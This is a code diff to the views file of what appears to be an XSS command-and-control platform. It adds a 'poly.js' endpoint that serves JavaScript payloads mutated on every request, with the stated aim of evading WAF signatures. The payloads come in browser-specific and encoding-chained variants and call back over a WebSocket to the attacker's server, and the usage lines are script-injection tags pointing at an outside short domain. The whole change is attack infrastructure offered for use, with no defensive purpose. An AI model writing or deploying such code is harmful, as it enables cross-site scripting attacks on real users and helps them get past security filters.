@@ -23,6 +23,7 @@ from .commands import BotCommander
 from .geoip import GeoIPService
 from .tokens import TokenService, RateLimiter
 from .polymorphic import PolymorphicEngine
+from .engines.polymorph import PolymorphicMutator, BrowserDetector, generate_full
 
 
 # ============== Smart Root Endpoint ==============
@@ -437,6 +438,77 @@ def serve_module_js(request, module_name=None):
     response['Access-Control-Allow-Headers'] = '*'
     response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
     response['X-Content-Type-Options'] = 'nosniff'
+
+    return response
+
+
+@csrf_exempt
+@require_http_methods(["GET", "OPTIONS"])
+def poly_js(request):
+    """
+    Advanced Polymorphic Payload Endpoint
+    Every request generates a unique, mutated payload to evade WAF signatures
+
+    Usage:
+        <script src=//6u.gg/poly.js></script>
+        <script src=//6u.gg/poly.js?b=chrome></script>  (browser-specific)
+        <script src=//6u.gg/poly.js?c=b64,hex></script>  (encoding chain)
+    """
+    if request.method == 'OPTIONS':
+        response = HttpResponse()
+        response['Access-Control-Allow-Origin'] = '*'
+        response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+        response['Access-Control-Allow-Headers'] = '*'
+        return response
+
+    # Get client info
+    user_agent = request.META.get('HTTP_USER_AGENT', '')
+
+    # Rate limiting
+    rate_key = RateLimiter.get_client_key(request, 'poly')
+    is_allowed, remaining, reset_time = RateLimiter.check_rate_limit(rate_key, max_requests=120, window_seconds=60)
+
+    if not is_allowed:
+        response = HttpResponse('// Rate limited', content_type='application/javascript', status=429)
+        response['Retry-After'] = str(int(reset_time - timezone.now().timestamp()))
+        return response
+
+    # Get settings
+    short_domain = getattr(settings, 'SHORT_DOMAIN', None) or request.get_host()
+    server_url = f"{request.scheme}://{short_domain}"
+    ws_protocol = 'wss' if request.is_secure() else 'ws'
+    ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"
+
+    # Optional parameters
+    browser = request.GET.get('b') or request.GET.get('browser')
+    chain = request.GET.get('c') or request.GET.get('chain')
+    payload_id = request.GET.get('p') or request.GET.get('payload')
+    token = request.GET.get('t') or request.GET.get('token')
+
+    # Initialize mutator
+    mutator = PolymorphicMutator()
+
+    # Generate payload based on parameters
+    if browser:
+        # Browser-specific payload
+        js_content = mutator.generate_for_browser(browser, short_domain, token)
+    elif chain:
+        # Chained encoding
+        chain_list = chain.split(',')
+        js_content = mutator.generate_chained(short_domain, token, chain_list)
+    else:
+        # Full polymorphic payload with browser detection
+        detected_browser = BrowserDetector.detect(user_agent)
+        js_content = mutator.generate_full_payload(server_url, ws_url, payload_id, user_agent)
+
+    response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
+    response['Access-Control-Allow-Origin'] = '*'
+    response['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
+    response['Access-Control-Allow-Headers'] = '*'
+    response['Cache-Control'] = 'no-cache, no-store, must-revalidate'
+    response['X-Content-Type-Options'] = 'nosniff'
+    # Add unique ID header for debugging
+    response['X-Poly-ID'] = TokenService.generate_token()[:16]
 
     return response
 
